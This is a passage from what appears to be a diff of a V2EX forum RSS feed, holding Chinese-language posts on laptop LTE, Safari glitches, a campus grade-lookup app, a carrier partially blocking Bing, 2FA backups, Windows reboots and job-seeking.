和手机热点的吗？</title><link>https://www.v2ex.com/t/1015768#reply3</link><description>&lt;p&gt;RT ，最近发现除了 thinkpad 也有相对便宜的笔记本搭载 LTE 了，请问下有对比过笔记本 LTE 和手机热点的吗，比如从速度、稳定性方面。&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 12:54:33 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015768#reply3</guid></item><item><title>[Safari] 各位的 Safari 有没有碰到过红绿灯被一个图标占掉的情况？</title><link>https://www.v2ex.com/t/1015767#reply1</link><description>Safari 的所有红绿灯都被这个图标占了，好像不太正常&lt;br /&gt;其他软件都没有这个问题，只有 Safari 被占了，另外我这里应该也没有 iPad&lt;br /&gt;图： &lt;a href="https://cln.sh/Jhlx78hb" rel="nofollow noopener" target="_blank"&gt;https://cln.sh/Jhlx78hb&lt;/a&gt;</description><pubDate>Thu, 15 Feb 2024 12:49:03 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015767#reply1</guid></item><item><title>[奇思妙想] 关于高校服务的商业变现思路</title><link>https://www.v2ex.com/t/1015766#reply10</link><description>&lt;p&gt;我们学校的教务系统很拉跨，所以仅限于校园网访问，同学放假后想查询考试成绩、学分绩等相当麻烦，所以我们开发了一个小程序，通过爬虫来访问本校教务，相当于高校教务小程序版，学校对我们的爬虫行为默许了，并在校内申请了大创项目，想问问各位，以这样的信息查询平台而言，除了投放广告外，还有什么更好的变现思路？请教一下各位大佬&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 12:16:14 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015766#reply10</guid></item><item><title>[问与答] 3HK 的 大湾区 45G DIY 储值卡值得买吗？</title><link>https://www.v2ex.com/t/1015765#reply2</link><description>&lt;p&gt;之前看到有人推荐这张 45G 香港流量卡，合法科学上网，值得买吗？&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 12:04:26 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015765#reply2</guid></item><item><title>[宽带症候群] 四川绵阳电信手机数据流量部分屏蔽 cn.bing.com</title><link>https://www.v2ex.com/t/1015763#reply0</link><description>春节外出，发现手机流量使用必应有时会出现长时间的白屏无响应(Android Chrome)，几十秒后恢复正常。最开始我以为这是必应服务器的问题，但后面问题频繁出现，且白屏时间非常有规律，我意识到这可能是运营商屏蔽。&lt;br /&gt;&lt;br /&gt;这种新颖的屏蔽方式引起了我的好奇，一回到家就进行了测试：&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;家庭宽带访问正常，两个 ip 均可达。&lt;br /&gt;&lt;br /&gt;诊断域名 &lt;a href="http://cn.bing.com" rel="nofollow noopener" target="_blank"&gt;cn.bing.com&lt;/a&gt;...&lt;br /&gt;当前是否联网:    已联网&lt;br /&gt;当前联网类型:    WIFI&lt;br /&gt;本地 IP:    192.168.1.2&lt;br /&gt;本地网关:    192.168.1.1&lt;br /&gt;本地 DNS:    ,&lt;br /&gt;远端域名:    &lt;a href="http://cn.bing.com" rel="nofollow noopener" target="_blank"&gt;cn.bing.com&lt;/a&gt;&lt;br /&gt;DNS 解析结果:    202.89.233.101,202.89.233.100 (44ms)&lt;br /&gt;&lt;br /&gt;开始 TCP 连接测试...&lt;br /&gt;Connect to host: 202.89.233.101...&lt;br /&gt;1's time=47ms,  2's time=45ms,  3's time=45ms,  4's time=40ms,  average=44ms&lt;br /&gt;Connect to host: 202.89.233.100...&lt;br /&gt;1's time=40ms,  2's time=45ms,  3's time=40ms,  4's time=47ms,  average=43ms&lt;br /&gt;----------------------------&lt;br /&gt;&lt;br /&gt;数据流量访问异常，其中一个 ip 不可达&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;诊断域名 &lt;a href="http://cn.bing.com" rel="nofollow noopener" target="_blank"&gt;cn.bing.com&lt;/a&gt;...&lt;br /&gt;当前是否联网:    已联网&lt;br /&gt;当前联网类型:    WAP&lt;br /&gt;本地 IP:    &lt;a href="http://10.xxx.xxx.xxx" rel="nofollow noopener" target="_blank"&gt;10.xxx.xxx.xxx&lt;/a&gt;&lt;br /&gt;本地 DNS:    ,&lt;br /&gt;远端域名:    &lt;a href="http://cn.bing.com" rel="nofollow noopener" target="_blank"&gt;cn.bing.com&lt;/a&gt;&lt;br /&gt;DNS 解析结果:    202.89.233.101,202.89.233.100 (3ms)&lt;br /&gt;&lt;br /&gt;开始 TCP 连接测试...&lt;br /&gt;Connect to host: 202.89.233.101...&lt;br /&gt;1's time=70ms,  2's time=49ms,  3's time=60ms,  4's time=47ms,  average=56ms&lt;br /&gt;Connect to host: 202.89.233.100...&lt;br /&gt;1's time=TimeOut,  2's time=TimeOut,  &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;这就可以解释为什么数据流量有时能正常访问，而有时会有 30s 的白屏了。&lt;br /&gt;&lt;br /&gt;DNS 请求得到的两个 ip 顺序不固定，chrome 会先尝试访问第一个 ip ，30s 后无响应会尝试访问第二个 ip 。如果 chrome 先收到 202.89.233.100 ，会尝试先以这个 ip 访问。很明显这个 ip 已被屏蔽，于是 chrome 会等待 30s 的超时时间，然后从第二个 ip 访问。如果 chrome 先收到 202.89.233.101,该 ip 没有被屏蔽，访问正常。这也就和上面的情况吻合了。</description><pubDate>Thu, 15 Feb 2024 11:25:23 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015763#reply0</guid></item><item><title>[问与答] 如何将 qq 收藏导出到硬盘中？</title><link>https://www.v2ex.com/t/1015762#reply5</link><description>&lt;p&gt;偶然打开 qq 收藏，发现当年和同学的照片、唱的歌都在里面。其中音色婉转，虽然稚嫩可笑，但毕竟是我的回忆。想把他导出来分享给同学。但是里面的音频文件无论如何都没法导出。&lt;/p&gt;
-&lt;p&gt;寄希望于 v 攒高手了&lt;/p&gt;
-&lt;p&gt;站内也搜了一下，有位成功的同学，但那是 2011 年的事情了&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 11:24:57 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015762#reply5</guid></item><item><title>[问与答] 急需一款订阅提醒软件，有推荐的吗？</title><link>https://www.v2ex.com/t/1015761#reply5</link><description>&lt;p&gt;最好支持小组件&lt;/p&gt;
-&lt;p&gt;UI 最好好看一点的，付费的也没事&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 11:13:54 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015761#reply5</guid></item><item><title>[问与答] 关于 2fa 备份的疑问</title><link>https://www.v2ex.com/t/1015759#reply6</link><description>&lt;p&gt;想问一下大家有没有必要把 2fa 的密钥都存下来。目前用的是微软家的 authenticator ，但是之前听 v 友说微软的这款验证器可能会丢失验证账号，为了在这种事情真的发生之后不至于手忙脚乱，请问有没有必要把密钥重新存一份下来呢？&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 10:52:31 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015759#reply6</guid></item><item><title>[Windows] 刚装好的 win11.23h2 就自己抽风重启怎么回事</title><link>https://www.v2ex.com/t/1015758#reply1</link><description>以前是 win10 升的 win11 ，dev 升级 26052 把电脑搞瘫痪了&lt;br /&gt;官网下了个 23h2 的 iso ，格盘彻底重装了下&lt;br /&gt;全新系统 什么软件，驱动都还没装就自己抽风重启&lt;br /&gt;是按 reset 的那种感觉，不是正常的注销重启</description><pubDate>Thu, 15 Feb 2024 10:51:17 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015758#reply1</guid></item><item><title>[职场话题] 如何 0 基础到找到一份程序员工作？这个问题可能有点可笑</title><link>https://www.v2ex.com/t/1015757#reply31</link><description>&lt;p&gt;我本人长期失业，个人财务状况很糟糕。
-我想找到一份工资比较高的工作。
-请问：我要具备哪些能力，最，最容易找到一份薪水不错的开发工作？
-这些能力可以通过自学获得吗？大概学习的方法是什么？&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 10:50:56 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015757#reply31</guid></item></channel></rss>
+&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;</description><pubDate>Thu, 15 Feb 2024 13:21:57 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015770#reply0</guid></item><item><title>[iPhone] 在国外使用 ios 自带地图时发生了不少笑话</title><link>https://www.v2ex.com/t/1015769#reply0</link><description>例如，今天用“查找”查看我妈在国内的位置，因为在国外网络环境下 ios 自带地图的中国部分数据是缺失的，我妈的位置落在地图上是一条施工中的道路，地图上这条道路标注为“在建”，于是 iOS 直接说我妈当前所处的位置叫做“在建”。&lt;br /&gt;&lt;br /&gt;又由于我妈正好坐在车上（实际上这条路已经通车，地图数据缺失而已），于是 iOS 画了一个开车的符号。&lt;br /&gt;&lt;br /&gt;一个人开车在一条“在建”的路上，这是神仙啊&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;a href="https://i.imgur.com/tyZ2Zrs.jpeg" rel="nofollow noopener" target="_blank"&gt;&lt;img class="embedded_image" rel="noreferrer" src="https://i.imgur.com/tyZ2Zrs.jpeg" /&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;a href="https://i.imgur.com/qapteup.jpeg" rel="nofollow noopener" target="_blank"&gt;&lt;img class="embedded_image" rel="noreferrer" src="https://i.imgur.com/qapteup.jpeg" /&gt;&lt;/a&gt;</description><pubDate>Thu, 15 Feb 2024 13:04:58 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015769#reply0</guid></item><item><title>[问与答] 有对比过笔记本 LTE 和手机热点的吗？</title><link>https://www.v2ex.com/t/1015768#reply3</link><description>&lt;p&gt;RT ，最近发现除了 thinkpad 也有相对便宜的笔记本搭载 LTE 了，请问下有对比过笔记本 LTE 和手机热点的吗，比如从速度、稳定性方面。&lt;/p&gt;</description><pubDate>Thu, 15 Feb 2024 12:54:33 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015768#reply3</guid></item><item><title>[Safari] 各位的 Safari 有没有碰到过红绿灯被一个图标占掉的情况？</title><link>https://www.v2ex.com/t/1015767#reply1</link><description>Safari 的所有红绿灯都被这个图标占了，好像不太正常&lt;br /&gt;其他软件都没有这个问题，只有 Safari 被占了，另外我这里应该也没有 iPad&lt;br /&gt;图： &lt;a href="https://cln.sh/Jhlx78hb" rel="nofollow noopener" target="_blank"&gt;https://cln.sh/Jhlx78hb&lt;/a&gt;</description><pubDate>Thu, 15 Feb 2024 12:49:03 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/1015767#reply1</guid></item></channel></rss>
